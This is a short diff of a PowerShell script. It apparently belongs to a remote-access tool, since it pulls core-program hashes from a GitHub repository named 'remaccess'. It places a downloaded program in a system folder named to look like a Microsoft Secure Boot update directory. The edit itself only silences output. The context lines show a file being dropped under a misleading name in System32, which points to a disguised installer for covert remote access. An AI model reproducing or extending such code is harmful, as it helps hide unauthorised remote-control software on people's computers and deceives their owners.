@@ -5,7 +5,7 @@ $programNameWithExtension = [System.IO.Path]::GetFileName($downloadUrl)
 $destinationPath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\$programNameWithExtension"
 $hashesUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/HashesOfCorePrograms.txt"
 if (-not (Test-Path (Split-Path $destinationPath))) {
-    New-Item -Path (Split-Path $destinationPath) -ItemType Directory -Force
+    New-Item -Path (Split-Path $destinationPath) -ItemType Directory -Force | Out-Null
 }
 if (Test-Path $destinationPath) {
     $existingFileHash = (Get-FileHash -Path $destinationPath -Algorithm SHA256).Hash
